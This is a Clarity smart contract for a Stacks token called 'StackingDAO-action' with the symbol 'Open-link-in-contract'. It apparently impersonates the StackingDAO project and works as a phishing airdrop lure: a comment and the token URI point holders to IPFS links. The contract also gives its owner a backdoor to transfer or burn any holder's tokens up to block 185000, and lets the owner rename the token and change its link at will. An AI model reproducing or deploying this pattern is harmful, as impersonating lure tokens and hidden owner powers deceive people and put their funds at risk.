;; Open https://ipfs.io/ipfs/QmSujPJewbPkqDcmBd7MiRCcyUH2fe3Jpg4Us9EPU82JG9

(impl-trait 'SP20X3DC5R091J8B6YPQT638J8NR1W83KN6TN5BJY.ft-trait.ft-trait)

(define-constant MAX_SUPPLY u1000000000000000)

(define-fungible-token StackingDAO-action MAX_SUPPLY)

(define-constant err-check-owner (err u1))
(define-constant err-transfer (err u2))
(define-constant err-burn (err u3))

(define-data-var owner principal tx-sender)
(define-data-var name (string-ascii 32) "StackingDAO-action")
(define-data-var symbol (string-ascii 32) "Open-link-in-contract")
(define-data-var token-uri (string-utf8 256) u"https://ipfs.io/ipfs/QmSdNnZTqEyMuGoL6xNPHdc874N3g1zAzCC3MpkVHNWSh5")

(define-private (check-owner)
    (ok (asserts! (is-eq tx-sender (var-get owner)) err-check-owner)))

(define-public (set-owner (new-owner principal))
    (begin (try! (check-owner))
        (ok (var-set owner new-owner))))

(define-private (allow-owner-operate)
    (and (<= block-height u185000)
        (is-eq tx-sender (var-get owner))))

(define-public (transfer (amt uint) (from principal) (to principal) (memo (optional (buff 34))))
    (begin (asserts! (or (is-eq tx-sender from) (allow-owner-operate)) err-transfer)
        (ft-transfer? StackingDAO-action amt from to)))

(define-public (burn (amt uint) (from principal))
    (begin (asserts! (or (is-eq tx-sender from) (allow-owner-operate)) err-burn)
        (ft-burn? StackingDAO-action amt from)))

(define-public (set-name (param-name (string-ascii 32)))
    (begin (try! (check-owner))
        (ok (var-set name param-name))))

(define-public (set-symbol (param-symbol (string-ascii 32)))
    (begin (try! (check-owner))
        (ok (var-set symbol param-symbol))))

(define-public (set-token-uri (param-token-uri (string-utf8 256)))
    (begin (try! (check-owner))
        (ok (var-set token-uri param-token-uri))))

(ft-mint? StackingDAO-action MAX_SUPPLY tx-sender)

(define-public (mint (amt uint) (to principal))
    (begin (try! (check-owner))
        (ft-mint? StackingDAO-action amt to)))

(define-read-only (get-name)
    (ok (var-get name)))

(define-read-only (get-symbol)
    (ok (var-get symbol)))

(define-read-only (get-decimals)
    (ok u6))

(define-read-only (get-balance (address principal))
    (ok (ft-get-balance StackingDAO-action address)))

(define-read-only (get-total-supply)
    (ok (ft-get-supply StackingDAO-action)))

(define-read-only (get-max-supply)
    (ok MAX_SUPPLY))

(define-read-only (get-token-uri) 
    (ok (some (var-get token-uri))))
